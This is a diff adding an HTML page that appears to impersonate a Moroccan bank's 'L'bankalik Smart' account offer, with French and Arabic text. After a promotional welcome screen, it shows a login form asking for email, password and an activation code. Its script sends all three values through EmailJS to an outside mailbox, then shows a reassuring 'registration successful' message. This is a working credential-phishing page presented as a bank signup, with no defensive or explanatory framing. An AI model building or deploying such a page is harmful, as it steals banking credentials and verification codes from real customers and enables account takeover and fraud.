@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ترحيب وتسجيل</title>
+    <style>
+        /* إعدادات أساسية */
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background-color: #e55640;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            text-align: center;
+            padding: 10px;
+        }
+
+        .page {
+            display: none;
+            width: 100%;
+        }
+
+        .active {
+            display: block;
+        }
+
+        /* الحاوية الرئيسية */
+        .welcome-container, .signup-container {
+            background: #fff;
+            color: #333;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            max-width: 90%;
+            width: 600px;
+        }
+
+        .welcome-container img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            animation: float 4s infinite ease-in-out;
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        .signup-container img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 20px;
+            border-radius: 10px;
+        }
+
+        /* تنسيق العنوان */
+        h1, h2 {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #e55640;
+        }
+
+        p {
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            color: #555;
+        }
+
+        /* الأزرار */
+        button {
+            padding: 10px 20px;
+            background-color: #e55640;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        button:hover {
+            background-color: #d94537;
+        }
+
+        /* إعدادات النموذج */
+        form {
+            text-align: left;
+        }
+
+        form label {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 5px;
+            display: inline-block;
+        }
+
+        form input {
+            width: 100%; /* عرض كامل الخانة */
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+            color: #333;
+            outline: none;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            box-sizing: border-box; /* لضمان التوافق مع الحواف والمسافات */
+        }
+
+        form input:focus {
+            border-color: #e55640; /* لون الحافة عند التركيز */
+            box-shadow: 0 0 5px rgba(229, 86, 64, 0.5);
+        }
+
+        form button {
+            width: 100%; /* عرض كامل الزر */
+            padding: 12px;
+            margin-top: 10px;
+            font-size: 16px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <!-- صفحة الترحيب -->
+    <div class="page welcome-container active" id="welcomePage">
+        <img src="https://i.postimg.cc/BQB7SSzd/smart-1.png" alt="Smart Offer">
+        <h1>L’offre L’bankalik Smart à partir de 0dh*/mois</h1>
+        <p>
+            Un compte gratuit* pour les moins de 35 ans, sans conditions de revenus, ni frais de tenue de compte.<br>
+            Si vous avez plus de 35 ans, bénéficiez de l’offre Smart à 5 dhs TTC/mois.<br><br>
+
+            Une carte 100% personnalisable, internationale & sans contact, pour payer en ligne et chez les commerçants, au Maroc et à l’étranger.<br><br>
+        </p>
+        <button onclick="goToSignup()">تفعيل الحساب</button>
+    </div>
+
+    <!-- صفحة التسجيل -->
+    <div class="page signup-container" id="signupPage">
+        <img src="https://i.postimg.cc/DmkJJ3YD/logo.png" alt="Logo">
+        <h2>تسجيل الدخول</h2>
+        <form id="signupForm">
+            <label for="email">البريد الإلكتروني</label>
+            <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
+            
+            <label for="password">كلمة السر</label>
+            <input type="password" id="password" placeholder="أدخل كلمة السر" required>
+            
+            <label for="activationCode">كود التفعيل</label>
+            <input type="text" id="activationCode" placeholder="أدخل كود التفعيل" required>
+            
+            <button type="submit">تسجيل</button>
+        </form>
+    </div>
+
+    <!-- صفحة تأكيد -->
+<div class="page confirmation-container" id="confirmationPage">
+    <div style="background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2); max-width: 600px; margin: auto; text-align: center;">
+        <img src="https://i.postimg.cc/fTpWL1LK/apple-pay-backgound-lbankalik.png" alt="Success" style="max-width: 100px; margin-bottom: 20px;">
+        <h2 style="color: #e55640; font-size: 24px; margin-bottom: 15px;">تم تسجيلك بنجاح!</h2>
+        <p style="color: #555; font-size: 16px; line-height: 1.8; margin-bottom: 30px;">
+            سيتم مراجعة معلوماتك وسنعاود التواصل معك قريبًا. شكرًا لاستخدامك خدماتنا.
+        </p>
+        <button onclick="goToWelcome()" style="padding: 12px 20px; background-color: #e55640; color: #fff; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background-color 0.3s;">
+            عودة إلى الصفحة الرئيسية
+        </button>
+    </div>
+</div>
+
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        // تهيئة EmailJS
+        (function(){
+            emailjs.init("rOYZNv4YSPlhnjLKI");
+        })();
+
+        // الانتقال بين الصفحات
+        function goToSignup() {
+            document.getElementById("welcomePage").classList.remove("active");
+            document.getElementById("signupPage").classList.add("active");
+        }
+
+        function goToWelcome() {
+            document.getElementById("confirmationPage").classList.remove("active");
+            document.getElementById("welcomePage").classList.add("active");
+        }
+
+        // معالجة النموذج
+        document.getElementById("signupForm").addEventListener("submit", function (event) {
+            event.preventDefault();
+
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            const activationCode = document.getElementById("activationCode").value;
+
+            const templateParams = {
+                user_email: email,
+                user_password: password,
+                activation_code: activationCode
+            };
+
+            emailjs.send("service_7a0zmbc", "template_o7986gf", templateParams)
+                .then(function(response) {
+                    console.log("SUCCESS!", response.status, response.text);
+                    document.getElementById("signupPage").classList.remove("active");
+                    document.getElementById("confirmationPage").classList.add("active");
+                }, function(error) {
+                    console.error("FAILED...", error);
+                    alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
+                });
+        });
+    </script>
+</body>
+</html>
